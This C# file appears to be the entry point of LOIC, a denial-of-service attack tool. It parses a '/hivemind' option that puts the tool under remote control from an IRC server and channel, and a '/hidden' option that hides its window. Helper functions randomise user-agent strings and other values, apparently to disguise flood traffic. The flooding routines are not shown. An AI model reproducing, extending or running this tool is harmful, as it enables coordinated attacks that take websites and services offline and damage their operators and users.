using System;
using System.Windows.Forms;
using System.Text;

namespace LOIC
{
	static class Program
	{
		[STAThread]
		static void Main(string[] cmdLine)
		{
			bool hive = false;
			bool hide = false;
			/* IRC */
			string ircserver = "";
			string ircport = "";
			string ircchannel = "";
			/* Lets try this! */
			int count = 0;
			foreach(string s in cmdLine)
			{
				/* IRC */
				if(s.ToLower() == "/hivemind")
				{
					hive = true;
					ircserver = cmdLine[count + 1]; //if no server entered let it crash
					try {ircport = cmdLine[count + 2];}
					catch(Exception) {ircport = "6667";} //default
					try {ircchannel = cmdLine[count + 3];}
					catch(Exception) {ircchannel = "#loic";} //default
				}
				/* Lets try this! */
				if(s.ToLower() == "/hidden") {hide = true;}
				count++;
			}
			Application.SetCompatibleTextRenderingDefault(false);
			Application.Run(new frmMain(hive, hide, ircserver, ircport, ircchannel));
		}
	}
	public class Functions
	{
		private static Random rnd = new Random();
		private static String[] ntv = {"6.0","6.1","6.2","6.3","10.0"};

		public static string RandomString()
		{
			StringBuilder builder = new StringBuilder();

			char ch;
			for(int i = 0; i < 6; i++)
			{
				ch = Convert.ToChar(Convert.ToInt32(Math.Floor(26 * rnd.NextDouble() + 65)));
				builder.Append(ch);
			}
			return builder.ToString();
		}

		public static string RandomUserAgent()
		{
			if(rnd.NextDouble() >= 0.5)
			{
				return String.Format("Mozilla/5.0 (Windows NT {0}; WOW64; rv:{1}.0) Gecko/20100101 Firefox/{1}.0", ntv[rnd.Next(0, ntv.Length)], rnd.Next(36, 46));
			}
			else
			{
				return String.Format("Mozilla/5.0 (Windows NT {0}; rv:{1}.0) Gecko/20100101 Firefox/{1}.0", ntv[rnd.Next(0, ntv.Length)], rnd.Next(36, 46));
			}
		}
	}
}